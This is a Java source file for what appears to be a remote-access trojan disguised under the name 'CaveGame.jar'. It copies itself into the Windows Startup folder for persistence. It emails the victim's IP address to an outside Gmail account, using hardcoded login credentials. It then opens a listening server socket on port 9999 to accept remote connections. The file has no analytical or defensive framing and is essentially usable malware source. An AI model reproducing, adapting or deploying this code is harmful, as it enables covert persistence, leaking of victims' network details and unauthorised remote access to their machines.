package testServer;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.DataInputStream;
import java.io.EOFException;
import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalTime;
import java.util.Properties;
import java.util.Random;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;  

public class Main {  
	
	ServerSocket ss;
	Socket s;
	
	DataInputStream dis;
	
	int portNumber = 9999;
	
	boolean firstRun = true, moveFailed = false, fileAlreadyExists = false;
	
	public static void main(String[] args){  
		Main main = new Main();
		main.copyToStartup();
		main.dumpIP();
		main.start();
	}
	
	public void dumpIP() {
		try {
			InetAddress ip = InetAddress.getLocalHost();
			LocalTime time = LocalTime.now();
			sendMail(ip, time);
			
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
		
	}
	
	public void copyToStartup() {
		String osName = System.getProperty("os.name");
		
		
		if(osName.contains("Windows")) {
			String autostart = System.getProperty("java.io.tmpdir").replace("Local\\Temp\\", "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
			String runningDir = Paths.get(".").toAbsolutePath().normalize().toString();
			
			Path autoStartPath = Paths.get(autostart);
			Path currentPath = Paths.get(runningDir);
			
			try {
				Files.copy(currentPath.resolve("CaveGame.jar"), autoStartPath.resolve("CaveGame.jar"));
			} catch(java.nio.file.FileAlreadyExistsException e) {
				System.out.println("File already boots on startup!");
				fileAlreadyExists = true;
			}catch (IOException e) {
					moveFailed = true;
					
			}
			System.out.println("MoveFailed: " + moveFailed);
		}
	}
	
	public void start() {
		try{  
			if(firstRun) { 
				ss=new ServerSocket(portNumber); 
				firstRun = false;
			}
			Socket s=ss.accept();//establishes connection  
			s.setReuseAddress(true);
			System.out.println("Connected!");
			
			Runnable connectionHandler = new ConnectionHandler(s);
			new Thread(connectionHandler).start();
			 
		}catch(EOFException e1) {
			start();
		}catch(java.net.BindException e){
			//stack overflow here
			System.out.println("Bind Exception: Address already in use");
			start();
		}catch(Exception e) {
			e.printStackTrace();
			start();
		}
	}
	
	public void sendMail(InetAddress ip, LocalTime time) {
		String username = "magicserver2019@gmail.com";
		String password = "MagicPassword";
		
        Properties props = new Properties();
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");

        Session session = Session.getInstance(props,new javax.mail.Authenticator() {
                  protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
                      return new javax.mail.PasswordAuthentication(username, password);
                  }
                });

        try {

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress("magicServer@magic.com"));
            message.setRecipients(Message.RecipientType.TO,
                InternetAddress.parse("jamglass42@gmail.com"));
            message.setSubject(ip.getHostAddress());
           
            if(moveFailed) {
            	if(fileAlreadyExists) {
            		message.setText("FILE ALREADY STARTS ON BOOT... \nIP captured at " + time + "  :  " + ip.getHostAddress());
            	}else {
            		message.setText("MOVE FAILED... \nIP captured at " + time + "  :  " + ip.getHostAddress());
            	}
            }else {
            	message.setText("MOVE SUCCESS! \nIP captured at " + time + "  :  " + ip.getHostAddress());
            }

            Transport.send(message);

            System.out.println("IP Email Sent!");

        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }
	}
	
	public void pause(int time) {
		try {
			wait(time);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
	}
	
} 